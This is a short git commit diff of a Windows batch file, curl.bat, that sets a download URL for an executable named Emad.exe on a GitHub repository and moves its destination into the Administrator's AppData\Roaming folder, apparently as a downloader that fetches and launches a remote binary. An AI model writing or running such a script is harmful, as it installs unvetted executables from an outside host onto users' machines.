70cde53d196c8feaca35b7915a4d766dfa3e6aa2
emad8787 <mdemadhossainfci28@gmail.com>
2025-03-14 05:00:02 -0700

    Update curl.bat

--- curl.bat
+++ curl.bat
@@ -1,6 +1,6 @@
 @echo off
 set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
-set "destination=C:\Windows\Temp\Emad.exe"
+set "destination=C:\Users\Administrator\AppData\Roaming\Emad.exe"
 set "arguments=Apply"
 
 echo WAITING FOR LAUNCH...
